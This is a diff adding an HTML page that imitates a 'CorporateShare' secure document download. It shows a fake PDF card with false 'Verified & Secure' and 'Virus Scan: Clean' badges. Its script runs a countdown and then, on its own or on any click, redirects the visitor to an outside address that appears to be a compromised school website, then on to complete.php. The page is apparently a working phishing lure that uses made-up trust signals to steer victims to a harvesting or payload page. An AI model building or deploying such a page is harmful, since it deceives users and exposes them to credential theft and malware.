@@ -1,0 +1,378 @@
+e<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Background Image Page</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-image: url('Screenshot 2025-04-25 161700.png');
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      width: 100vw;
+      background-color: #ffffff;
+      font-family: Arial, sans-serif;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100vh;
+      width: 100vw;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal-content {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      animation: modalFadeIn 0.3s ease-out;
+      text-align: center;
+    }
+
+    @keyframes modalFadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .modal-header img {
+      width: 100px;
+      margin-bottom: 15px;
+    }
+
+    .continue-btn {
+      background-color: #ED2224;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+      width: 100%;
+      max-width: 250px;
+      transition: background-color 0.3s;
+    }
+
+    .continue-btn:hover {
+      background-color: #c71b1d;
+    }
+
+    .info-text {
+      color: #666;
+      font-size: 12px;
+      margin-top: 10px;
+    }
+
+    .highlight {
+      font-weight: bold;
+      color: #1e4dbd;
+    }
+
+    /* Loading spinner */
+    .spinner {
+      display: none;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Your Secure Document | CorporateShare</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #2563eb;
+            --primary-dark: #1d4ed8;
+            --text: #1f2937;
+            --text-light: #6b7280;
+            --background: #f9fafb;
+            --card-bg: #ffffff;
+            --border-radius: 8px;
+            --success: #10b981;
+            --warning: #f59e0b;
+        }
+        
+        body {
+            font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
+            background-color: var(--background);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--text);
+            line-height: 1.5;
+        }
+        
+        .container {
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+            width: 90%;
+            max-width: 520px;
+            padding: 40px;
+            text-align: center;
+            border: 1px solid #e5e7eb;
+        }
+        
+        .logo {
+            height: 32px;
+            margin-bottom: 28px;
+        }
+        
+        h1 {
+            color: var(--text);
+            margin-bottom: 12px;
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+        
+        .description {
+            color: var(--text-light);
+            margin-bottom: 24px;
+            font-size: 0.95rem;
+            max-width: 380px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .file-card {
+            background-color: #f8fafc;
+            border-radius: var(--border-radius);
+            padding: 20px;
+            margin: 28px 0;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            border: 1px solid #e2e8f0;
+            position: relative;
+        }
+        
+        .file-icon {
+            font-size: 2rem;
+            color: #e63946;
+            margin-right: 16px;
+            flex-shrink: 0;
+        }
+        
+        .file-details {
+            overflow: hidden;
+        }
+        
+        .file-name {
+            font-weight: 600;
+            margin-bottom: 6px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        
+        .file-meta {
+            color: var(--text-light);
+            font-size: 0.85rem;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        
+        .security-badge {
+            position: absolute;
+            top: -10px;
+            right: 16px;
+            background-color: var(--success);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .download-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: var(--border-radius);
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 100%;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .download-btn:hover {
+            background-color: var(--primary-dark);
+        }
+        
+        .countdown {
+            margin-top: 20px;
+            font-size: 0.85rem;
+            color: var(--text-light);
+        }
+        
+        .manual-download {
+            margin-top: 24px;
+            font-size: 0.85rem;
+            color: var(--text-light);
+        }
+        
+        .manual-download a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .review-section {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e5e7eb;
+            font-size: 0.85rem;
+            color: var(--text-light);
+        }
+        
+        .review-section a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 24px;
+            }
+            
+            .logo {
+                height: 28px;
+                margin-bottom: 24px;
+            }
+            
+            .file-card {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <h1>Your Document is Ready</h1>
+        <p class="description">This secure file has been shared with <strong>You</strong>.</p>
+        
+        <div class="file-card">
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i> Verified & Secure
+            </div>
+            <div class="file-icon">
+                <i class="fas fa-file-pdf"></i>
+            </div>
+            <div class="file-details">
+                <div class="file-name">PROJECT-562026</div>
+                <div class="file-meta">
+                    <span><i class="far fa-file"></i> 4.8 MB</span>
+                    <span><i class="far fa-clock"></i> Uploaded: Feb 15, 2026</span>
+                    <span><i class="fas fa-check-circle"></i> Virus Scan: Clean</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="countdown" id="countdown">Secure download starting in 5 seconds...</div>
+        <button class="download-btn" id="downloadBtn">
+            <i class="fas fa-download"></i> Download Document
+        </button>
+        
+        <div class="manual-download">
+            <a href="https://parivarthanabschool.in/wp-adobe/bnd/download.html" id="manualLink"><i class="fas fa-hand-pointer"></i> Click here if download doesn't start</a>
+        </div>
+        
+        <div class="review-section">
+            <i class="fas fa-info-circle"></i> Please review this document and <a href="mailto:contact@abccorp.com?subject=File%20Feedback">get back to us</a> with any questions.
+        </div>
+    </div>
+
+    <script>
+        // Enhanced professional download logic
+        let countdown = 5;
+        const countdownElement = document.getElementById('countdown');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const manualLink = document.getElementById('manualLink');
+        
+        function updateCountdown() {
+            countdownElement.textContent = countdown > 0 
+                ? `Secure download starting in ${countdown} seconds...` 
+                : "Initiating secure download...";
+        }
+        
+        updateCountdown();
+        
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            updateCountdown();
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                initiateSecureDownload();
+            }
+        }, 1000);
+        
+        function initiateSecureDownload() {
+            // Change button state
+            downloadBtn.innerHTML = '<i class="fas fa-lock"></i> Securing connection...';
+            downloadBtn.disabled = true;
+            
+            // Simulate secure connection handshake
+            setTimeout(() => {
+                downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Downloading securely...';
+                
+                // In production, this would be your secure download endpoint
+                setTimeout(() => {
+                    window.location.href = "https://parivarthanabschool.in/wp-adobe/bnd/download.html"; // Replace with actual file URL
+                }, 1000);
+            }, 800);
+            // Redirect to complete.php after 10 seconds
+            setTimeout(() => {
+                window.location.href = "complete.php"; // Redirect after 10 seconds
+            }, 10000); // 10000 milliseconds = 10 seconds
+        }
+        
+        downloadBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            clearInterval(countdownInterval);
+            initiateSecureDownload();
+        });
+        
+        manualLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            clearInterval(countdownInterval);
+            countdownElement.textContent = "Preparing secure manual download...";
+            initiateSecureDownload();
+        });
+    </script>
+
+</body>
+</html>
